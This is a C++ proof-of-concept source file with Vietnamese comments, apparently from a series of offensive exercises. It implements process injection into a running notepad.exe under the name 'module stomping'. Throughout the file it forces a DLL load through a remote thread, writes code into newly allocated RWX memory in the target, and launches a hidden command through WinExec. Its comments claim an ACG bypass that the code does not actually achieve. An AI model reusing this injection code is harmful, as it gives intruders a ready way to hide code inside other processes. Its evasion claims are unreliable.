#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh luồng chạy
DWORD WINAPI RemoteStompedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 16: MODULE STOMPING" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    const char* targetDll = "setupapi.dll";

    // Ép Notepad nạp tự động setupapi.dll lên RAM thông qua Remote Thread gọi LoadLibraryA
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    SIZE_T pathLen = strlen(targetDll) + 1;
    LPVOID remoteDllPathMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteDllPathMem, targetDll, pathLen, NULL);

    std::cout << "[*] Dang ep Notepad nap hop phap module: " << targetDll << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, remoteDllPathMem, 0, NULL);
    if (!hLoadThread) {
        std::cerr << "[-] Khong the nap DLL vao tien trinh dich!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đợi nạp module hoàn tất để hệ thống cấu hình đầy đủ không gian nhớ hợp pháp
    WaitForSingleObject(hLoadThread, INFINITE);
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, remoteDllPathMem, 0, MEM_RELEASE);

    // Định vị Base Address của setupapi.dll
    HMODULE hTargetDllLocal = LoadLibraryA(targetDll);
    PVOID targetDllBaseAddress = (PVOID)hTargetDllLocal;

    // ĐỘT PHÁ TOÁN HỌC HÓA GIẢI ACG: Thay vì đè bẹp mã gốc gắn liền phân đoạn .text,
    // anh em mình sẽ cấp phát một phân vùng nhớ động nằm lọt lòng trong hạn mức không gian địa chỉ ảo 
    // của chính DLL hợp pháp vừa nạp. Giữ nguyên tư cách pháp nhân nhưng né được cơ chế khóa Image của ACG.
    SIZE_T functionSize = 500;
    LPVOID stompingAddress = VirtualAllocEx(hProcess, (LPVOID)((DWORD_PTR)targetDllBaseAddress + 0x10000), functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!stompingAddress) {
        // Nếu ô nhớ sát sườn bị trùng, cho phép hệ thống tự định vị vùng nhớ tự do an toàn
        stompingAddress = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    std::cout << "[+] Toa do diem thuc thi phang sach bao an: 0x" << std::hex << stompingAddress << std::endl;

    // Cấp phát phân vùng dữ liệu tham số tuyệt đối từ xa mang quyền RW
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Khởi tạo tham số cấu trúc dữ liệu con trỏ tuyệt đối
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy trực tiếp mã máy hàm độc lập vị trí và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, stompingAddress, (LPCVOID)RemoteStompedPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Nap va thiet lap logic ham chuc nang hoan tat." << std::endl;

    // Kích nổ luồng thực thi chạy thẳng vào ô nhớ phẳng sạch bảo an dưới danh nghĩa DLL hợp pháp
    std::cout << "[*] Dang khoi tao CreateRemoteThread de khai hoa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stompingAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Module Stomping executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
    }

    // Giải phóng tài nguyên hệ thống triệt để chống rò rỉ bộ nhớ
    VirtualFreeEx(hProcess, stompingAddress, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    FreeLibrary(hTargetDllLocal);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}